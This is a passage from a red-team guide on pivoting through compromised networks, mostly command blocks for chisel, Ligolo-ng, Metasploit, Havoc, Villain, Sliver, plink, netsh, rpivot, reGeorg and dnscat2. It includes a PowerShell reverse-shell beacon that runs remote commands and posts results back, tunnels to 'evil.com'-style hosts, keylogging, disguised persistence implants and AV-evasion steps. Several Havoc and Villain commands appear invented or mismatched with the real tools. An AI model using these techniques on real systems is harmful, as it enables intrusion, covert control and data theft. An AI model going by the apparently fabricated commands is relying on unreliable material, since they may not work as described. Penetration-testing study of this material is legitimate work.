R:socks\n\n# Fingerprint verification for security\nchisel client --fingerprint xx:xx:xx:xx --auth user:pass server_ip:8080 R:socks\n\n# Keepalive for unstable connections\nchisel client --keepalive 10s --max-retry-count 5 server_ip:8080 R:socks\n\n# Custom headers for stealth\nchisel client --header "User-Agent: Mozilla/5.0" server_ip:8080 R:socks\n\n# IPv6 support\nchisel client --auth user:pass [::1]:8080 R:socks\n\n# Compression enabled\nchisel client --auth user:pass server_ip:8080 R:socks --compression\n'})}),"\n",(0,s.jsx)(n.h2,{id:"4-ligolo-ng-transparent-network-tunneling",children:"4. Ligolo-ng: Transparent Network Tunneling"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The following examples require both Ligolo-ng proxy and agent binaries to be compiled and accessible on the attacker and target hosts. IP addresses, TUN interface names, and certificate files should be adjusted as per your lab or operational setup."})}),"\n",(0,s.jsx)(n.p,{children:"Ligolo-ng implements a sophisticated userland networking stack through TUN interface manipulation, providing transparent network access without SOCKS proxy requirements."}),"\n",(0,s.jsx)(n.h3,{id:"41-infrastructure-setup-and-configuration",children:"4.1 Infrastructure Setup and Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Proxy server preparation (Linux)\nsudo ip tuntap add dev ligolo mode tun\nsudo ip link set ligolo up\nsudo ip route add 192.168.56.0/24 dev ligolo\n\n# Proxy server with custom TUN interface\nsudo ip tuntap add dev tun_pivot mode tun\nsudo ip link set tun_pivot up\nsudo ip addr add 192.168.255.1/24 dev tun_pivot\n\n# Start proxy with self-signed certificate\n./proxy -selfcert\n\n# Start proxy with custom certificate\n./proxy -certfile server.crt -keyfile server.key\n\n# Proxy with custom listening address\n./proxy -laddr 0.0.0.0:11601 -selfcert\n\n# Agent connection establishment\n./agent -connect attacker_ip:11601 -ignore-cert\n\n# Agent with retry mechanism\n./agent -connect attacker_ip:11601 -ignore-cert -retry\n\n# Bind agent (listening mode)\n./agent -listen 0.0.0.0:11601 -ignore-cert\n\n# Agent with custom socket timeout\n./agent -connect attacker_ip:11601 -ignore-cert -timeout 30s\n"})}),"\n",(0,s.jsx)(n.h3,{id:"42-session-management-and-network-configuration",children:"4.2 Session Management and Network Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Ligolo-ng interactive commands\n\n# List all connected agents\nligolo-ng \xbb session\n\n# Select specific agent session\nligolo-ng \xbb session 1\n\n# Display agent network information\nagent \xbb ifconfig\n\n# Start tunneling session\nagent \xbb start\n\n# Stop active tunnel\nagent \xbb stop\n\n# Add route to specific network\nagent \xbb tunnel_add --tun ligolo --route 10.10.10.0/24\n\n# Add multiple network routes\nagent \xbb tunnel_add --tun ligolo --route 172.16.0.0/16\nagent \xbb tunnel_add --tun ligolo --route 10.0.0.0/8\n\n# Remove specific route\nagent \xbb tunnel_del --tun ligolo --route 10.10.10.0/24\n"})}),"\n",(0,s.jsx)(n.h3,{id:"43-advanced-tunneling-features",children:"4.3 Advanced Tunneling Features"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Port forwarding through agent\nagent \xbb listener_add --addr 0.0.0.0:8000 --to 10.0.0.10:80 --tcp\n\n# UDP service forwarding\nagent \xbb listener_add --addr 0.0.0.0:53 --to 10.0.0.53:53 --udp\n\n# Reverse port forwarding\nagent \xbb listener_add --addr 0.0.0.0:443 --to 192.168.1.100:443 --tcp\n\n# List active listeners\nagent \xbb listener_list\n\n# Remove specific listener\nagent \xbb listener_del --id 1\n\n# Agent relay for multi-hop pivoting\n./agent -connect first_pivot:11601 -ignore-cert -relay\n\n# Agent with SOCKS5 proxy\n./agent -connect attacker_ip:11601 -ignore-cert -socks5 127.0.0.1:1080\n\n# Command execution on agent host\nagent \xbb shell whoami\nagent \xbb shell "netstat -an | grep LISTEN"\nagent \xbb shell "ipconfig /all"\n'})}),"\n",(0,s.jsx)(n.h2,{id:"5-metasploit-framework-comprehensive-pivoting-integration",children:"5. Metasploit Framework: Comprehensive Pivoting Integration"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The following commands assume you have a running Metasploit Framework instance and Meterpreter payloads are properly established. Adjust network addresses, session IDs, and handler parameters to match your engagement."})}),"\n",(0,s.jsx)(n.p,{children:"The Metasploit Framework provides extensive pivoting capabilities through integrated session management, automated routing, and payload coordination."}),"\n",(0,s.jsx)(n.h3,{id:"51-session-based-routing-configuration",children:"5.1 Session-Based Routing Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Manual route addition\nmsf > route add 10.10.10.0/24 1\n\n# Automated route discovery and configuration\nmsf > use post/multi/manage/autoroute\nmsf post(autoroute) > set SESSION 1\nmsf post(autoroute) > set SUBNET 10.10.10.0\nmsf post(autoroute) > set NETMASK 255.255.255.0\nmsf post(autoroute) > run\n\n# Automatic network discovery\nmeterpreter > run autoroute -auto\n\n# Add specific subnet routes\nmeterpreter > run autoroute -s 192.168.1.0/24\nmeterpreter > run autoroute -s 172.16.0.0/16\n\n# View current routing table\nmsf > route print\n\n# Delete specific route\nmsf > route delete 10.10.10.0/24 1\n\n# Flush all routes for session\nmsf > route flush 1\n"})}),"\n",(0,s.jsx)(n.h3,{id:"52-socks-proxy-implementation",children:"5.2 SOCKS Proxy Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Start SOCKS4 proxy\nmsf > use auxiliary/server/socks4a\nmsf auxiliary(socks4a) > set SRVPORT 9050\nmsf auxiliary(socks4a) > run -j\n\n# Start SOCKS5 proxy with authentication\nmsf > use auxiliary/server/socks_proxy\nmsf auxiliary(socks_proxy) > set SRVPORT 9050\nmsf auxiliary(socks_proxy) > set VERSION 5\nmsf auxiliary(socks_proxy) > set USERNAME user\nmsf auxiliary(socks_proxy) > set PASSWORD pass\nmsf auxiliary(socks_proxy) > run -j\n\n# SOCKS proxy with custom interface binding\nmsf auxiliary(socks_proxy) > set SRVHOST 127.0.0.1\nmsf auxiliary(socks_proxy) > run -j\n\n# Stop SOCKS proxy\nmsf > jobs -k [job_id]\n"})}),"\n",(0,s.jsx)(n.h3,{id:"53-port-forwarding-mechanisms",children:"5.3 Port Forwarding Mechanisms"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Local port forwarding through Meterpreter\nmeterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.10\n\n# Local port forwarding with specific interface\nmeterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100 -L 127.0.0.1\n\n# Reverse port forwarding\nmeterpreter > portfwd add -R -l 8000 -p 80 -L 192.168.1.100\n\n# List active port forwards\nmeterpreter > portfwd list\n\n# Delete specific port forward\nmeterpreter > portfwd delete -l 3389 -p 3389 -r 10.10.10.10\n\n# Flush all port forwards\nmeterpreter > portfwd flush\n"})}),"\n",(0,s.jsx)(n.h3,{id:"54-advanced-metasploit-pivoting-techniques",children:"5.4 Advanced Metasploit Pivoting Techniques"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Multi-session routing\nmsf > route add 10.10.10.0/24 1\nmsf > route add 10.20.30.0/24 2\n\n# Session passing between handlers\nmeterpreter > sessions -k\n\n# Background session for pivoting\nmeterpreter > background\n\n# Session upgrading for better pivoting\nmsf > use post/multi/manage/shell_to_meterpreter\nmsf post(shell_to_meterpreter) > set SESSION 1\nmsf post(shell_to_meterpreter) > run\n\n# Persistent route establishment\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set AutoRunScript post/multi/manage/autoroute\n"})}),"\n",(0,s.jsx)(n.h2,{id:"6-havoc-c2-modern-command-and-control-pivoting",children:"6. Havoc C2: Modern Command and Control Pivoting"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Havoc C2 operations require a configured and running Havoc server. Ensure you generate appropriate agents and listeners for your specific architecture and scenario. Replace hostnames, ports, and agent parameters accordingly."})}),"\n",(0,s.jsx)(n.p,{children:"Havoc represents a state-of-the-art command and control framework with sophisticated pivoting capabilities designed for advanced persistent threat simulation."}),"\n",(0,s.jsx)(n.h3,{id:"61-agent-deployment-and-configuration",children:"6.1 Agent Deployment and Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Generate pivot-capable agent\nhavoc --generate-agent --arch x64 --format exe --sleep 5 --jitter 10 --pivot\n\n# Deploy agent with custom configuration\nhavoc --agent-config sleep=10,jitter=20,killdate=2024-12-31\n\n# Deploy via existing demon session\ndemon> spawn --arch x64 --format exe --listener pivot_tcp\n\n# Agent with injection capabilities\ndemon> inject --pid 1234 --arch x64 --format shellcode\n"})}),"\n",(0,s.jsx)(n.h3,{id:"62-tcp-pivot-implementation",children:"6.2 TCP Pivot Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Establish TCP pivot listener\ndemon> pivot tcp --lhost 192.168.1.100 --lport 4444\n\n# Connect new agent through pivot\ndemon> pivot tcp --rhost pivot_host --rport 4444\n\n# Bind TCP pivot on compromised host\ndemon> pivot tcp --bind --lport 443 --host 0.0.0.0\n\n# List active pivots\ndemon> pivot list\n\n# Remove specific pivot\ndemon> pivot remove --id 1\n"})}),"\n",(0,s.jsx)(n.h3,{id:"63-socks-proxy-configuration",children:"6.3 SOCKS Proxy Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Start SOCKS5 proxy through agent\ndemon> socks start --port 1080 --host 127.0.0.1\n\n# SOCKS proxy with authentication\ndemon> socks start --port 1080 --user admin --pass secret\n\n# Configure routing through SOCKS\ndemon> route add --network 10.10.10.0/24 --interface socks --port 1080\n\n# Stop SOCKS proxy\ndemon> socks stop --port 1080\n\n# List SOCKS proxies\ndemon> socks list\n"})}),"\n",(0,s.jsx)(n.h3,{id:"64-advanced-havoc-pivoting-features",children:"6.4 Advanced Havoc Pivoting Features"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Named pipe pivoting for same-host lateral movement\ndemon> pivot smb --pipe-name "msf-pipe" --host target_host\n\n# HTTP(S) tunnel with custom user agent\ndemon> pivot http --host proxy_host --port 8080 --user-agent "Mozilla/5.0"\n\n# DNS tunneling for covert communication\ndemon> pivot dns --domain evil.com --server 8.8.8.8\n\n# Session passing between agents\ndemon> session pass --session-id 2 --pivot-id 1\n\n# Session cloning for redundancy\ndemon> session clone --session-id 1 --method tcp --host 192.168.1.200\n\n# P2P mesh networking\ndemon> pivot p2p --enable --port 6666 --peers "192.168.1.100:6666"\n'})}),"\n",(0,s.jsx)(n.h2,{id:"7-villain-framework-collaborative-c2-with-session-sharing",children:"7. Villain Framework: Collaborative C2 with Session Sharing"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Villain requires Python 3 and is available in Kali Linux repositories. Replace IP addresses, usernames, passwords, and port numbers with values appropriate to your environment. The collaborative features require multiple Villain instances running on different machines."})}),"\n",(0,s.jsx)(n.p,{children:"Villain is a high-level stage 0/1 C2 framework that excels at managing multiple reverse TCP and HoaxShell-based shells while providing unique collaborative capabilities for team operations."}),"\n",(0,s.jsx)(n.h3,{id:"71-framework-installation-and-setup",children:"7.1 Framework Installation and Setup"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install from Kali repositories\nsudo apt install villain\n\n# Manual installation from source\ngit clone https://github.com/t3l3machus/Villain\ncd Villain\npip3 install -r requirements.txt\n\n# Start Villain server\nvillain\n\n# Start with custom ports\nvillain -p 65001 -x 8080 -n 4444 -f 8888\n\n# Start with SSL support for HoaxShell HTTPS\nvillain -c cert.pem -k key.pem\n"})}),"\n",(0,s.jsx)(n.h3,{id:"72-payload-generation-and-management",children:"7.2 Payload Generation and Management"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Generate Windows PowerShell payload\nVillain > generate os=windows lhost=192.168.1.100\n\n# Generate Linux payload\nVillain > generate os=linux lhost=192.168.1.100\n\n# Generate HoaxShell payload (HTTP)\nVillain > generate os=windows lhost=192.168.1.100 payload=hoaxshell\n\n# Generate HoaxShell HTTPS payload\nVillain > generate os=windows lhost=192.168.1.100 payload=hoaxshell-ssl\n\n# List all backdoor payloads\nVillain > backdoors\n\n# List active sessions\nVillain > sessions\n"})}),"\n",(0,s.jsx)(n.h3,{id:"73-session-management-and-interaction",children:"7.3 Session Management and Interaction"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Connect to a session\nVillain > shell 1\n\n# Execute commands in pseudo-shell\nshell > whoami\nshell > ipconfig /all\nshell > netstat -an\n\n# Upload files via HTTP File Smuggler\nshell > upload /path/to/local/file.exe\n\n# Inject and execute scripts fileless\nshell > inject /path/to/script.ps1\n\n# Invoke ConPtyShell for fully interactive shell\nVillain > conptyshell 1\n\n# Exit without terminating sessions\nVillain > flee\n"})}),"\n",(0,s.jsx)(n.h3,{id:"74-collaborative-features-and-sibling-servers",children:"7.4 Collaborative Features and Sibling Servers"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Connect to another Villain instance\nVillain > connect 192.168.1.200:65001\n\n# Share sessions with connected siblings\nVillain > share\n\n# Send messages to all connected siblings\nVillain > #Team message here\n\n# List connected sibling servers\nVillain > siblings\n\n# Disconnect from sibling\nVillain > disconnect 192.168.1.200\n"})}),"\n",(0,s.jsx)(n.h3,{id:"75-advanced-villain-techniques",children:"7.5 Advanced Villain Techniques"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Session persistence and metadata\n# Villain automatically stores session metadata\n# Allows re-establishment of HoaxShell sessions\n\n# Purge all session metadata\nVillain > purge\n\n# Custom obfuscation for AV evasion\n# Edit templates in /Core/payload_templates/\n# Replace with obfuscated versions\n\n# Background execution with compression\nvillain -p 65001 --quiet --compress\n\n# Multi-handler configuration\n# config.yml example:\nhandlers:\n  - port: 8080\n    type: http\n    auth: user:pass\n  - port: 443\n    type: https\n    cert: cert.pem\n    key: key.pem\n"})}),"\n",(0,s.jsx)(n.h3,{id:"76-hoaxshell-integration",children:"7.6 HoaxShell Integration"}),"\n",(0,s.jsx)(n.p,{children:"HoaxShell payloads use HTTP(S) to establish beacon-like reverse shells, making them particularly effective against restrictive firewalls:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"# Example HoaxShell payload structure (simplified)\n$s='192.168.1.100:8080';\n$i='session-id';\nwhile($true){\n    $c=(Invoke-WebRequest -UseBasicParsing -Uri $s -Headers @{\"Authorization\"=$i}).Content;\n    if($c -ne 'None') {\n        $r=Invoke-Expression $c 2>&1 | Out-String;\n        Invoke-WebRequest -Uri $s -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r))\n    }\n    Start-Sleep -Seconds 0.8\n}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"8-sliver-framework-modern-go-based-c2-with-advanced-pivoting",children:"8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Sliver requires downloading the appropriate binary for your platform from the official releases. Replace all example IPs, domains, and file paths with your specific values. Session mode is required for pivoting and SOCKS proxy features."})}),"\n",(0,s.jsx)(n.p,{children:"Sliver is an open-source, cross-platform C2 framework written in Go, providing fast, portable, and extensible capabilities for adversarial operations."}),"\n",(0,s.jsx)(n.h3,{id:"81-server-setup-and-configuration",children:"8.1 Server Setup and Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Download and install Sliver\nwget https://github.com/BishopFox/sliver/releases/download/v1.5.x/sliver-server_linux\nchmod +x sliver-server_linux\n./sliver-server_linux\n\n# Start server in daemon mode\n./sliver-server_linux daemon\n\n# Configure multiplayer mode\n./sliver-server_linux operator --name operator1 --lhost 192.168.1.100 --lport 31337\n\n# Connect as operator\n./sliver-client_linux --config operator1.cfg\n"})}),"\n",(0,s.jsx)(n.h3,{id:"82-listener-configuration",children:"8.2 Listener Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Start HTTP listener\nsliver > http --domain example.com --lhost 192.168.1.100 --lport 80\n\n# Start HTTPS listener with custom certificate\nsliver > https --domain secure.example.com --lhost 192.168.1.100 --lport 443 --cert cert.pem --key key.pem\n\n# Start DNS listener\nsliver > dns --domains example.com --lhost 192.168.1.100\n\n# Start mutual TLS listener\nsliver > mtls --lhost 192.168.1.100 --lport 8888\n\n# Start WireGuard listener\nsliver > wg --lhost 192.168.1.100 --lport 51820\n\n# List active listeners\nsliver > jobs\n"})}),"\n",(0,s.jsx)(n.h3,{id:"83-implant-generation",children:"8.3 Implant Generation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Generate session implant (interactive)\nsliver > generate --http example.com --os windows --arch amd64 --format exe\n\n# Generate beacon implant (callback intervals)\nsliver > generate beacon --http example.com --os windows --arch amd64 --seconds 60 --jitter 10\n\n# Generate staged payload\nsliver > generate stager --http example.com --os windows --arch amd64 --format shellcode\n\n# Generate implant with custom settings\nsliver > generate --http example.com --os linux --arch amd64 --name "custom-implant" --debug --skip-symbols\n\n# Service implant for persistence\nsliver > generate --http example.com --os windows --format service --service-name "WindowsUpdate"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"84-pivoting-and-network-tunneling",children:"8.4 Pivoting and Network Tunneling"}),"\n",(0,s.jsx)(n.p,{children:"Sliver session implants allow operators to create SOCKS5 proxies and pivots for tunneling traffic through compromised hosts:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Select session for pivoting\nsliver > use [session-id]\n\n# Start SOCKS5 proxy\nsliver (session) > socks5 start --host 127.0.0.1 --port 1080\n\n# List active SOCKS proxies\nsliver > socks5\n\n# Stop SOCKS proxy\nsliver (session) > socks5 stop -i [proxy-id]\n\n# Port forwarding\nsliver (session) > portfwd add --remote 192.168.2.100:3389 --local :3389\n\n# List port forwards\nsliver (session) > portfwd\n\n# Create pivot listener\nsliver (session) > pivots tcp --bind 192.168.2.100:9090\n\n# Generate pivot implant\nsliver > generate --tcp-pivot 192.168.2.100:9090\n"})}),"\n",(0,s.jsx)(n.h3,{id:"85-advanced-sliver-operations",children:"8.5 Advanced Sliver Operations"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Process injection and migration\nsliver (session) > migrate [pid]\n\n# Execute .NET assembly in memory\nsliver (session) > execute-assembly /path/to/assembly.exe\n\n# Load and execute BOF (Beacon Object File)\nsliver (session) > bof /path/to/bof.o\n\n# Screenshot capture\nsliver (session) > screenshot\n\n# Keylogger\nsliver (session) > keylogger start\nsliver (session) > keylogger dump\n\n# Token manipulation\nsliver (session) > impersonate [username]\n\n# Lateral movement via psexec\nsliver (session) > psexec --host 192.168.2.101 --service-name "UpdateService" --service-desc "Windows Update"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"86-beacon-management",children:"8.6 Beacon Management"}),"\n",(0,s.jsx)(n.p,{children:"Beacons check in with the server at configurable intervals, making them less noisy than session implants:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Interact with beacon\nsliver > use [beacon-id]\n\n# Check beacon tasks\nsliver (beacon) > tasks\n\n# Fetch task results\nsliver (beacon) > tasks fetch [task-id]\n\n# Reconfigure beacon\nsliver (beacon) > reconfig --interval 120 --jitter 30\n\n# Execute commands\nsliver (beacon) > execute whoami\nsliver (beacon) > shell "net user"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"87-detection-evasion-features",children:"8.7 Detection Evasion Features"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Traffic encryption (built-in)\n# All C2 traffic encrypted independently of transport protocol\n\n# Canary domains for sandbox detection\nsliver > generate --http example.com --canary google.com,microsoft.com\n\n# Custom obfuscation\nsliver > generate --http example.com --os windows --obfuscate\n\n# Traffic profiles\nsliver > profiles new --name "chrome" --format http\nsliver > profiles set-header "chrome" "User-Agent" "Mozilla/5.0 Chrome/91.0"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"88-multi-hop-pivot-chains",children:"8.8 Multi-Hop Pivot Chains"}),"\n",(0,s.jsx)(n.p,{children:"Pivots can be arbitrarily nested, allowing traffic to route through multiple compromised hosts:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Establish first pivot\nsliver > use session-1\nsliver (session-1) > pivots tcp --bind 10.10.10.100:8888\n\n# Generate implant for second hop\nsliver > generate --tcp-pivot 10.10.10.100:8888 --name "hop2"\n\n# After second implant connects, create another pivot\nsliver > use session-2\nsliver (session-2) > pivots tcp --bind 172.16.1.50:9999\n\n# Generate implant for third hop\nsliver > generate --tcp-pivot 172.16.1.50:9999 --name "hop3"\n\n# Result: Attacker \u2192 Session-1 \u2192 Session-2 \u2192 Session-3\n'})}),"\n",(0,s.jsx)(n.h2,{id:"9-windows-specific-pivoting-tools",children:"9. Windows-Specific Pivoting Tools"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"These sections assume you have administrative privileges on the Windows host. Substitute IP addresses, ports, usernames, and file paths as required by your target environment. Ensure all binaries (e.g., Plink, PowerShell scripts) are accessible on the system."})}),"\n",(0,s.jsx)(n.h3,{id:"91-netsh-port-forwarding",children:"9.1 Netsh Port Forwarding"}),"\n",(0,s.jsx)(n.p,{children:"Windows netsh provides native port forwarding capabilities without requiring additional tools:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-cmd",children:"# Enable IP forwarding\nnetsh interface ipv4 set global forwarding=enabled\n\n# Add port forwarding rule\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.1.100\n\n# Forward RDP through pivot\nnetsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.10\n\n# Show all port forwarding rules\nnetsh interface portproxy show all\n\n# Delete specific rule\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=127.0.0.1\n\n# Reset all port forwarding rules\nnetsh interface portproxy reset\n\n# Advanced rule with specific interface\nnetsh interface portproxy add v4tov4 listenport=443 listenaddress=192.168.1.100 connectport=443 connectaddress=10.0.0.100\n"})}),"\n",(0,s.jsx)(n.h3,{id:"92-plink-putty-link-implementation",children:"9.2 Plink (PuTTY Link) Implementation"}),"\n",(0,s.jsx)(n.p,{children:"Plink provides command-line SSH connectivity for Windows environments:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-cmd",children:'# Basic SOCKS proxy establishment\nplink.exe -ssh -D 9050 user@pivot_host\n\n# Local port forwarding\nplink.exe -ssh -L 8080:192.168.1.100:80 user@pivot_host\n\n# Remote port forwarding\nplink.exe -ssh -R 8080:127.0.0.1:80 user@pivot_host\n\n# Background execution with key authentication\nplink.exe -ssh -i private_key.ppk -D 9050 -N user@pivot_host\n\n# Multiple port forwards\nplink.exe -ssh -L 3389:192.168.1.101:3389 -L 445:192.168.1.102:445 user@pivot_host\n\n# Automatic login with stored session\nplink.exe -load "pivot_session" -D 9050 -N\n\n# Connection through HTTP proxy\nplink.exe -ssh -proxycmd "connect.exe -H proxy:8080 %host %port" user@target\n'})}),"\n",(0,s.jsx)(n.h3,{id:"93-powershell-based-pivoting",children:"9.3 PowerShell-Based Pivoting"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The following PowerShell/C# code provides a framework for implementing a SOCKS5 proxy server. The actual SOCKS5 protocol logic (handling client negotiation and relaying) must be implemented by the user. This is provided for reference; a complete implementation is left as an exercise for advanced readers. For full details, refer to RFC 1928."})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'# PowerShell port forwarding script\nfunction Start-PortForward {\n    param($LocalPort, $RemoteHost, $RemotePort)\n    \n    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $LocalPort)\n    $listener.Start()\n    \n    while ($true) {\n        $client = $listener.AcceptTcpClient()\n        $remote = New-Object System.Net.Sockets.TcpClient($RemoteHost, $RemotePort)\n        \n        # Relay traffic between client and remote\n        Start-Job -ScriptBlock {\n            param($c, $r)\n            $c.GetStream().CopyTo($r.GetStream())\n        } -ArgumentList $client, $remote\n    }\n}\n\n# SOCKS proxy implementation in PowerShell\n$code = @"\nusing System;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Threading;\n\npublic class SocksProxy {\n    public static void Start(int port) {\n        TcpListener listener = new TcpListener(IPAddress.Any, port);\n        listener.Start();\n        while (true) {\n            TcpClient client = listener.AcceptTcpClient();\n            Thread thread = new Thread(() => HandleClient(client));\n            thread.Start();\n        }\n    }\n    \n    private static void HandleClient(TcpClient client) {\n        // SOCKS5 protocol implementation should be inserted here.\n        // For full details, refer to RFC 1928.\n    }\n}\n"@\n\nAdd-Type -TypeDefinition $code\n[SocksProxy]::Start(1080)\n'})}),"\n",(0,s.jsx)(n.h2,{id:"10-cross-platform-tunneling-solutions",children:"10. Cross-Platform Tunneling Solutions"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"All examples in this section assume you have downloaded or cloned the respective tool repositories (e.g., rpivot, reGeorg, stunnel, dnscat2) and fulfilled any dependencies. Substitute IP addresses, script paths, and ports to fit your scenario."})}),"\n",(0,s.jsx)(n.h3,{id:"101-rpivot-http-based-tunneling",children:"10.1 rpivot: HTTP-Based Tunneling"}),"\n",(0,s.jsx)(n.p,{children:"rpivot provides HTTP/HTTPS tunneling with SOCKS proxy capabilities:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Server setup (attacker machine)\npython rpivot_server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 9050\n\n# Client connection (compromised host)\npython rpivot_client.py --server-ip attacker_ip --server-port 9999\n\n# HTTPS mode for encrypted tunneling\npython rpivot_server.py --server-port 443 --server-ip 0.0.0.0 --proxy-port 9050 --ssl\n\n# Client with custom headers\npython rpivot_client.py --server-ip attacker_ip --server-port 9999 --user-agent "Mozilla/5.0"\n\n# Client through HTTP proxy\npython rpivot_client.py --server-ip attacker_ip --server-port 9999 --proxy proxy_host:8080\n'})}),"\n",(0,s.jsx)(n.h3,{id:"102-regeorg-web-application-tunneling",children:"10.2 reGeorg: Web Application Tunneling"}),"\n",(0,s.jsx)(n.p,{children:"reGeorg creates tunnels through web application servers:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Upload tunnel script to web server\n# tunnel.aspx, tunnel.php, tunnel.jsp, or tunnel.py\n\n# Start reGeorg client\npython reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php\n\n# Client with authentication\npython reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php -H "Cookie: PHPSESSID=abc123"\n\n# Client with custom headers\npython reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php -H "User-Agent: Custom" -H "X-Forwarded-For: 127.0.0.1"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"103-stunnel-tls-encryption-wrapper",children:"10.3 Stunnel: TLS Encryption Wrapper"}),"\n",(0,s.jsx)(n.p,{children:"Stunnel provides TLS encryption for arbitrary protocols:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Server configuration (stunnel.conf)\n[https]\naccept = 443\nconnect = 80\ncert = /etc/stunnel/cert.pem\nkey = /etc/stunnel/key.pem\n\n# Client configuration\n[https]\naccept = 8080\nconnect = server_ip:443\n"})}),"\n",(0,s.jsx)(n.h3,{id:"104-dnscat2-dns-tunneling",children:"10.4 dnscat2: DNS Tunneling"}),"\n",(0,s.jsx)(n.p,{children:"dnscat2 provides covert communication through DNS queries:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Server setup\nruby dnscat2.rb evil.domain.com\n\n# Client connection\n./dnscat2 evil.domain.com\n\n# Client with specific DNS server\n./dnscat2 --dns server=8.8.8.8 evil.domain.com\n\n# Encrypted session\nruby dnscat2.rb --security=open evil.domain.com\n./dnscat2 --secret=password evil.domain.com\n"})}),"\n",(0,s.jsx)(n.h2,{id:"11-socat-swiss-army-knife-of-network-relays",children:"11. Socat: Swiss Army Knife of Network Relays"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Socat must be installed on both source and destination hosts. Replace port numbers, interface addresses, and file paths as needed for your environment."})}),"\n",(0,s.jsx)(n.p,{children:"Socat provides bidirectional data relay capabilities with extensive protocol support:"}),"\n",(0,s.jsx)(n.h3,{id:"111-basic-relay-configurations",children:"11.1 Basic Relay Configurations"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# TCP port forwarding\nsocat 